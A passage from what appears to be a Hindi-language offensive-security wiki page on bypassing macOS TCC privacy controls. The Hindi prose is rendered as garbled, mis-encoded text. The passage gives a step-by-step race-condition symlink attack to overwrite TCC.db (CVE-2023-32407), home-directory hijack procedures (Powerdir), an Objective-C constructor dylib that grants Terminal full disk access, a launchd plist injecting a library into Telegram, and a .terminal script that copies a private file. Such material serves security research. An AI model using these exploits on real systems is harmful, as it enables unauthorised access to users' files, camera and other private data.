* рдПрдХ рдлрд╛рдЗрд▓ `open()` рдХреА рдЬрд╛рдПрдЧреА, рдЬрд┐рд╕реЗ `path/.dat.nosyncXXXX.XXXXXX` рдХрд╣рд╛ рдЬрд╛рдПрдЧрд╛ (X рдпрд╛рджреГрдЪреНрдЫрд┐рдХ рд╣реИ)
* рдПрдХ рдпрд╛ рдЕрдзрд┐рдХ `write()` рдлрд╛рдЗрд▓ рдХреА рд╕рд╛рдордЧреНрд░реА рдХреЛ рд▓рд┐рдЦреЗрдВрдЧреЗ (рд╣рдо рдЗрд╕реЗ рдирд┐рдпрдВрддреНрд░рд┐рдд рдирд╣реАрдВ рдХрд░рддреЗ)
* `path/.dat.nosyncXXXX.XXXXXX` рдХреЛ `path/name` рдореЗрдВ `renamed()` рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛

рдпрд╣ рдПрдХ рдЕрд╕реНрдерд╛рдпреА рдлрд╛рдЗрд▓ рд▓реЗрдЦрди рд╣реИ, рдЗрд╕рдХреЗ рдмрд╛рдж **`rename(old, new)`** **рдЬреЛ рд╕реБрд░рдХреНрд╖рд┐рдд рдирд╣реАрдВ рд╣реИред**

рдпрд╣ рд╕реБрд░рдХреНрд╖рд┐рдд рдирд╣реАрдВ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдЗрд╕реЗ **рдкреБрд░рд╛рдиреЗ рдФрд░ рдирдП рдкрдереЛрдВ рдХреЛ рдЕрд▓рдЧ рд╕реЗ рд╣рд▓ рдХрд░рдирд╛ рд╣реЛрдЧрд╛**, рдЬрд┐рд╕рдореЗрдВ рдХреБрдЫ рд╕рдордп рд▓рдЧ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдпрд╣ Race Condition рдХреЗ рд▓рд┐рдП рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╣реЛ рд╕рдХрддрд╛ рд╣реИред рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рдЖрдк `xnu` рдлрдВрдХреНрд╢рди `renameat_internal()` рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВред

{% hint style="danger" %}
рддреЛ, рдореВрд▓ рд░реВрдк рд╕реЗ, рдпрджрд┐ рдПрдХ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдПрдХ рдлреЛрд▓реНрдбрд░ рд╕реЗ рдирд╛рдо рдмрджрд▓ рд░рд╣реА рд╣реИ рдЬрд┐рд╕реЗ рдЖрдк рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рдЖрдк RCE рдЬреАрдд рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЗрд╕реЗ рдПрдХ рдЕрд▓рдЧ рдлрд╛рдЗрд▓ рддрдХ рдкрд╣реБрдБрдЪрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ рдпрд╛, рдЗрд╕ CVE рдХреА рддрд░рд╣, рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдРрдк рджреНрд╡рд╛рд░рд╛ рдмрдирд╛рдИ рдЧрдИ рдлрд╛рдЗрд▓ рдХреЛ рдЦреЛрд▓реЗрдВ рдФрд░ рдПрдХ FD рд╕реНрдЯреЛрд░ рдХрд░реЗрдВред

рдпрджрд┐ рдирд╛рдо рдмрджрд▓рдиреЗ рдХреА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдПрдХ рдлреЛрд▓реНрдбрд░ рддрдХ рдкрд╣реБрдБрдЪрддреА рд╣реИ рдЬрд┐рд╕реЗ рдЖрдк рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░рддреЗ рд╣реИрдВ, рдЬрдмрдХрд┐ рдЖрдкрдиреЗ рд╕реНрд░реЛрдд рдлрд╛рдЗрд▓ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд┐рдпрд╛ рд╣реИ рдпрд╛ рдЗрд╕рдХрд╛ рдПрдХ FD рд╣реИ, рддреЛ рдЖрдк рдЧрдВрддрд╡реНрдп рдлрд╛рдЗрд▓ (рдпрд╛ рдлреЛрд▓реНрдбрд░) рдХреЛ рдПрдХ symlink рдХреА рдУрд░ рдЗрдВрдЧрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдмрджрд▓ рд╕рдХрддреЗ рд╣реИрдВ, рддрд╛рдХрд┐ рдЖрдк рдЬрдм рдЪрд╛рд╣реЗрдВ рд▓рд┐рдЦ рд╕рдХреЗрдВред
{% endhint %}

рдпрд╣ CVE рдореЗрдВ рд╣рдорд▓рд╛ рдерд╛: рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ `TCC.db` рдХреЛ рдЕрдзрд┐рд▓реЗрдЦрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рд╣рдо рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

* `/Users/hacker/ourlink` рдмрдирд╛рдПрдВ рдЬреЛ `/Users/hacker/Library/Application Support/com.apple.TCC/` рдХреА рдУрд░ рдЗрдВрдЧрд┐рдд рдХрд░рддрд╛ рд╣реИ
* рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА `/Users/hacker/tmp/` рдмрдирд╛рдПрдВ
* `MTL_DUMP_PIPELINES_TO_JSON_FILE=/Users/hacker/tmp/TCC.db` рд╕реЗрдЯ рдХрд░реЗрдВ
* рдЗрд╕ env var рдХреЗ рд╕рд╛рде `Music` рдЪрд▓рд╛рдХрд░ рдмрдЧ рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░реЗрдВ
* `/Users/hacker/tmp/.dat.nosyncXXXX.XXXXXX` рдХреЗ `open()` рдХреЛ рдкрдХрдбрд╝реЗрдВ (X рдпрд╛рджреГрдЪреНрдЫрд┐рдХ рд╣реИ)
* рдпрд╣рд╛рдБ рд╣рдо рдЗрд╕ рдлрд╛рдЗрд▓ рдХреЛ рд▓рд┐рдЦрдиреЗ рдХреЗ рд▓рд┐рдП рднреА `open()` рдХрд░рддреЗ рд╣реИрдВ, рдФрд░ рдлрд╛рдЗрд▓ рдбрд┐рд╕реНрдХреНрд░рд┐рдкреНрдЯрд░ рдХреЛ рдкрдХрдбрд╝ рдХрд░ рд░рдЦрддреЗ рд╣реИрдВ
* `/Users/hacker/tmp` рдХреЛ `/Users/hacker/ourlink` рдХреЗ рд╕рд╛рде **рдПрдХ рд▓реВрдк рдореЗрдВ** рддрд╛рддреНрдХрд╛рд▓рд┐рдХ рд░реВрдк рд╕реЗ рдмрджрд▓реЗрдВ
* рд╣рдо рдпрд╣ рдЗрд╕рд▓рд┐рдП рдХрд░рддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рд╣рдорд╛рд░реА рд╕рдлрд▓рддрд╛ рдХреА рд╕рдВрднрд╛рд╡рдирд╛рдПрдВ рдЕрдзрд┐рдХрддрдо рд╣реЛрдВ рдХреНрдпреЛрдВрдХрд┐ рд░реЗрд╕ рд╡рд┐рдВрдбреЛ рдХрд╛рдлреА рд╕рдВрдХреАрд░реНрдг рд╣реИ, рд▓реЗрдХрд┐рди рд░реЗрд╕ рд╣рд╛рд░рдиреЗ рдХрд╛ рдиреБрдХрд╕рд╛рди рдирдЧрдгреНрдп рд╣реИ
* рдереЛрдбрд╝рд╛ рдЗрдВрддрдЬрд╛рд░ рдХрд░реЗрдВ
* рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдХреНрдпрд╛ рд╣рдо рднрд╛рдЧреНрдпрд╢рд╛рд▓реА рдереЗ
* рдпрджрд┐ рдирд╣реАрдВ, рддреЛ рд╢реАрд░реНрд╖ рд╕реЗ рдлрд┐рд░ рд╕реЗ рдЪрд▓рд╛рдПрдВ

рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП [https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html](https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html) рджреЗрдЦреЗрдВред

{% hint style="danger" %}
рдЕрдм, рдпрджрд┐ рдЖрдк env variable `MTL_DUMP_PIPELINES_TO_JSON_FILE` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рддреЗ рд╣реИрдВ рддреЛ рдРрдкреНрд╕ рд▓реЙрдиреНрдЪ рдирд╣реАрдВ рд╣реЛрдВрдЧреЗ
{% endhint %}

### Apple Remote Desktop

рд░реВрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рдЖрдк рдЗрд╕ рд╕реЗрд╡рд╛ рдХреЛ рд╕рдХреНрд╖рдо рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ **ARD рдПрдЬреЗрдВрдЯ рдХреЛ рдкреВрд░реНрдг рдбрд┐рд╕реНрдХ рдПрдХреНрд╕реЗрд╕ рдорд┐рд▓реЗрдЧрд╛** рдЬрд┐рд╕реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ рдПрдХ рдирдпрд╛ **TCC рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдбреЗрдЯрд╛рдмреЗрд╕** рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рджреБрд░реБрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

## **NFSHomeDirectory** рджреНрд╡рд╛рд░рд╛

TCC рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ HOME рдлреЛрд▓реНрдбрд░ рдореЗрдВ рдПрдХ рдбреЗрдЯрд╛рдмреЗрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ рдЬреЛ **$HOME/Library/Application Support/com.apple.TCC/TCC.db** рдкрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд▓рд┐рдП рд╡рд┐рд╢рд┐рд╖реНрдЯ рд╕рдВрд╕рд╛рдзрдиреЛрдВ рддрдХ рдкрд╣реБрдВрдЪ рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░рддрд╛ рд╣реИред\
рдЗрд╕рд▓рд┐рдП, рдпрджрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ TCC рдХреЛ $HOME env variable рдХреЗ рд╕рд╛рде рдПрдХ **рдЕрд▓рдЧ рдлреЛрд▓реНрдбрд░** рдХреА рдУрд░ рдЗрдВрдЧрд┐рдд рдХрд░рддреЗ рд╣реБрдП рдкреБрдирдГ рдЖрд░рдВрдн рдХрд░рдиреЗ рдореЗрдВ рд╕рдлрд▓ рд╣реЛрддрд╛ рд╣реИ, рддреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ **/Library/Application Support/com.apple.TCC/TCC.db** рдореЗрдВ рдПрдХ рдирдпрд╛ TCC рдбреЗрдЯрд╛рдмреЗрд╕ рдмрдирд╛ рд╕рдХрддрд╛ рд╣реИ рдФрд░ TCC рдХреЛ рдХрд┐рд╕реА рднреА рдРрдк рдХреЛ рдХреЛрдИ рднреА TCC рдЕрдиреБрдорддрд┐ рджреЗрдиреЗ рдХреЗ рд▓рд┐рдП рдЪрд╛рд▓рд╛рдХреА рд╕реЗ рдкреНрд░реЗрд░рд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИред

{% hint style="success" %}
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ Apple рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рдкреНрд░реЛрдлрд╝рд╛рдЗрд▓ рдореЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд рд╕реЗрдЯрд┐рдВрдЧ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ **`NFSHomeDirectory`** рд╡рд┐рд╢реЗрд╖рддрд╛ рдХреЗ рд▓рд┐рдП **`$HOME` рдХреЗ рдореВрд▓реНрдп рдХреЗ рд░реВрдк рдореЗрдВ**, рдЗрд╕рд▓рд┐рдП рдпрджрд┐ рдЖрдк рдЗрд╕ рдореВрд▓реНрдп рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╡рд╛рд▓реЗ рдПрдХ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рд╕рдордЭреМрддрд╛ рдХрд░рддреЗ рд╣реИрдВ (**`kTCCServiceSystemPolicySysAdminFiles`**), рдЖрдк рдЗрд╕ рд╡рд┐рдХрд▓реНрдк рдХреЛ TCC рдмрд╛рдпрдкрд╛рд╕ рдХреЗ рд╕рд╛рде **рд╣рдерд┐рдпрд╛рд░ рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ**ред
{% endhint %}

### [CVE-2020тАУ9934 - TCC](./#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](./#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

**рдкрд╣рд▓рд╛ POC** [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) рдФрд░ [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ **HOME** рдлреЛрд▓реНрдбрд░ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рддрд╛ рд╣реИред

1. рд▓рдХреНрд╖рд┐рдд рдРрдк рдХреЗ рд▓рд┐рдП рдПрдХ _csreq_ blob рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВред
2. рдЖрд╡рд╢реНрдпрдХ рдкрд╣реБрдВрдЪ рдФрд░ _csreq_ blob рдХреЗ рд╕рд╛рде рдПрдХ рдирдХрд▓реА _TCC.db_ рдлрд╛рдЗрд▓ рд▓рдЧрд╛рдПрдВред
3. [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) рдХреЗ рд╕рд╛рде рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА Directory Services рдкреНрд░рд╡рд┐рд╖реНрдЯрд┐ рдХреЛ рдирд┐рд░реНрдпрд╛рдд рдХрд░реЗрдВред
4. рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рд╣реЛрдо рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рдмрджрд▓рдиреЗ рдХреЗ рд▓рд┐рдП Directory Services рдкреНрд░рд╡рд┐рд╖реНрдЯрд┐ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░реЗрдВред
5. рд╕рдВрд╢реЛрдзрд┐рдд Directory Services рдкреНрд░рд╡рд┐рд╖реНрдЯрд┐ рдХреЛ [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) рдХреЗ рд╕рд╛рде рдЖрдпрд╛рдд рдХрд░реЗрдВред
6. рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ _tccd_ рдХреЛ рд░реЛрдХреЗрдВ рдФрд░ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдкреБрдирдГ рдЖрд░рдВрдн рдХрд░реЗрдВред

рджреВрд╕рд░рд╛ POC **`/usr/libexec/configd`** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рдерд╛ рдЬрд┐рд╕рдореЗрдВ `com.apple.private.tcc.allow` рдХреЗ рд╕рд╛рде рдореВрд▓реНрдп `kTCCServiceSystemPolicySysAdminFiles` рдерд╛ред\
**`configd`** рдХреЛ **`-t`** рд╡рд┐рдХрд▓реНрдк рдХреЗ рд╕рд╛рде рдЪрд▓рд╛рдирд╛ рд╕рдВрднрд╡ рдерд╛, рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдПрдХ **рдХрд╕реНрдЯрдо рдмрдВрдбрд▓ рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░ рд╕рдХрддрд╛ рдерд╛**ред рдЗрд╕рд▓рд┐рдП, рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рд╣реЛрдо рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рдмрджрд▓рдиреЗ рдХреЗ рд▓рд┐рдП** **`dsexport`** рдФрд░ **`dsimport`** рд╡рд┐рдзрд┐ рдХреЛ **`configd` рдХреЛрдб рдЗрдВрдЬреЗрдХреНрд╢рди** рд╕реЗ **рдмрджрд▓ рджреЗрддрд╛ рд╣реИ**ред

рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП [**рдореВрд▓ рд░рд┐рдкреЛрд░реНрдЯ**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/) рджреЗрдЦреЗрдВред

## рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдЗрдВрдЬреЗрдХреНрд╢рди рджреНрд╡рд╛рд░рд╛

рдПрдХ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рдЕрдВрджрд░ рдХреЛрдб рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░рдиреЗ рдФрд░ рдЗрд╕рдХреА TCC рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд╡рд┐рднрд┐рдиреНрди рддрдХрдиреАрдХреЗрдВ рд╣реИрдВ:

{% content-ref url="../../../macos-proces-abuse/" %}
[macos-proces-abuse](../../../macos-proces-abuse/)
{% endcontent-ref %}

рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, TCC рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдмрд╕реЗ рдЖрдо рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдЗрдВрдЬреЗрдХреНрд╢рди **рдкреНрд▓рдЧрдЗрдиреНрд╕ (рд▓реЛрдб рд▓рд╛рдЗрдмреНрд░реЗрд░реА)** рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкрд╛рдпрд╛
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```
рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП [**рдореВрд▓ рд░рд┐рдкреЛрд░реНрдЯ**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/) рджреЗрдЦреЗрдВред

### рдбрд┐рд╡рд╛рдЗрд╕ рдЕрдмреНрд╕рдЯреНрд░реИрдХреНрд╢рди рд▓реЗрдпрд░ (DAL) рдкреНрд▓рдЧ-рдЗрдиреНрд╕

рд╕рд┐рд╕реНрдЯрдо рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдЬреЛ Core Media I/O рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдХреИрдорд░рд╛ рд╕реНрдЯреНрд░реАрдо рдЦреЛрд▓рддреЗ рд╣реИрдВ (рдПрдкреНрд╕ рдЬрд┐рдирдореЗрдВ **`kTCCServiceCamera`** рд╣реЛрддрд╛ рд╣реИ) рд╡реЗ `/Library/CoreMediaIO/Plug-Ins/DAL` рдореЗрдВ рд╕реНрдерд┐рдд **рдЗрди рдкреНрд▓рдЧ-рдЗрдиреНрд╕ рдХреЛ рдкреНрд░реЛрд╕реЗрд╕ рдореЗрдВ рд▓реЛрдб рдХрд░рддреЗ рд╣реИрдВ** (SIP рдкреНрд░рддрд┐рдмрдВрдзрд┐рдд рдирд╣реАрдВ рд╣реИ)ред

рд╡рд╣рд╛рдВ рдПрдХ рд▓рд╛рдЗрдмреНрд░реЗрд░реА рдХреЛ рд╕рд╛рдорд╛рдиреНрдп **рдХрдВрд╕реНрдЯреНрд░рдХреНрдЯрд░** рдХреЗ рд╕рд╛рде рд╕реНрдЯреЛрд░ рдХрд░рдирд╛ рдХреЛрдб **рдЗрдВрдЬреЗрдХреНрдЯ** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд╛рдо рдХрд░реЗрдЧрд╛ред

рдХрдИ Apple рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдЗрд╕рдХреЗ рд▓рд┐рдП рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдереЗред

### Firefox

Firefox рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдореЗрдВ `com.apple.security.cs.disable-library-validation` рдФрд░ `com.apple.security.cs.allow-dyld-environment-variables` рдПрдВрдЯрд╛рдЗрдЯрд▓рдореЗрдВрдЯреНрд╕ рдереЗ:
```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```
рдЗрд╕рдХрд╛ рдЖрд╕рд╛рдиреА рд╕реЗ рд╢реЛрд╖рдг рдХреИрд╕реЗ рдХрд░реЗрдВ, рдЗрд╕рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП [**рдореВрд▓ рд░рд┐рдкреЛрд░реНрдЯ рджреЗрдЦреЗрдВ**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).

### CVE-2020-10006

рдмрд╛рдЗрдирд░реА `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` рдореЗрдВ **`com.apple.private.tcc.allow`** рдФрд░ **`com.apple.security.get-task-allow`** рдПрдВрдЯрд╛рдЗрдЯрд▓рдореЗрдВрдЯреНрд╕ рдереЗ, рдЬрд┐рд╕рд╕реЗ рдкреНрд░реЛрд╕реЗрд╕ рдореЗрдВ рдХреЛрдб рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░рдиреЗ рдФрд░ TCC рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдорд┐рд▓рддреА рдереАред

### CVE-2023-26818 - Telegram

Telegram рдореЗрдВ **`com.apple.security.cs.allow-dyld-environment-variables`** рдФрд░ **`com.apple.security.cs.disable-library-validation`** рдПрдВрдЯрд╛рдЗрдЯрд▓рдореЗрдВрдЯреНрд╕ рдереЗ, рдЗрд╕рд▓рд┐рдП рдЗрд╕рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЗрд╕рдХреА рдЕрдиреБрдорддрд┐рдпреЛрдВ рддрдХ **рдкрд╣реБрдВрдЪ рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛ рд╕рдВрднрд╡ рдерд╛** рдЬреИрд╕реЗ рдХрд┐ рдХреИрдорд░рд╛ рдХреЗ рд╕рд╛рде рд░рд┐рдХреЙрд░реНрдбрд┐рдВрдЧред рдЖрдк [**рд▓рд┐рдЦрд┐рдд рдореЗрдВ рдкреЗрд▓реЛрдб рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдПрдиреНрд╡рд╛рдпрд░рдирдореЗрдВрдЯ рд╡реЗрд░рд┐рдПрдмрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рд▓рд╛рдЗрдмреНрд░реЗрд░реА рдХреЛ рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ **рдХрд╕реНрдЯрдо plist** рдмрдирд╛рдпрд╛ рдЧрдпрд╛ рдерд╛ рддрд╛рдХрд┐ рдЗрд╕ рд▓рд╛рдЗрдмреНрд░реЗрд░реА рдХреЛ рдЗрдВрдЬреЗрдХреНрдЯ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ рдФрд░ **`launchctl`** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЗрд╕реЗ рд▓реЙрдиреНрдЪ рдХрд┐рдпрд╛ рдЧрдпрд╛:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```
## рдУрдкрди рдЗрдирд╡реЛрдХреЗрд╢рди рдХреЗ рджреНрд╡рд╛рд░рд╛

рд╕реИрдВрдбрдмреЙрдХреНрд╕реНрдб рд╣реЛрддреЗ рд╣реБрдП рднреА **`open`** рдХреЛ рдЗрдиреНрд╡реЛрдХ рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИред

### рдЯрд░реНрдорд┐рдирд▓ рд╕реНрдХреНрд░рд┐рдкреНрдЯреНрд╕

рдЯреЗрдХ рд▓реЛрдЧреЛрдВ рджреНрд╡рд╛рд░рд╛ рдкреНрд░рдпреБрдХреНрдд рдХрдВрдкреНрдпреВрдЯрд░реЛрдВ рдореЗрдВ рдХрдо рд╕реЗ рдХрдо, рдЯрд░реНрдорд┐рдирд▓ рдХреЛ **рдкреВрд░реНрдг рдбрд┐рд╕реНрдХ рдПрдХреНрд╕реЗрд╕ (FDA)** рджреЗрдирд╛ рдЖрдо рдмрд╛рдд рд╣реИред рдФрд░ рдЗрд╕рдХреЗ рд╕рд╛рде **`.terminal`** рд╕реНрдХреНрд░рд┐рдкреНрдЯреНрд╕ рдХреЛ рдЗрдиреНрд╡реЛрдХ рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИред

**`.terminal`** рд╕реНрдХреНрд░рд┐рдкреНрдЯреНрд╕ рдкреНрд▓рд┐рд╕реНрдЯ рдлрд╛рдЗрд▓реЗрдВ рд╣реЛрддреА рд╣реИрдВ рдЬреИрд╕реЗ рдХрд┐ рдпрд╣ рдПрдХ, рдЬрд┐рд╕рдореЗрдВ рдХрдорд╛рдВрдб рдХреЛ **`CommandString`** рдХреБрдВрдЬреА рдореЗрдВ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╣реЛрддрд╛ рд╣реИ:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```
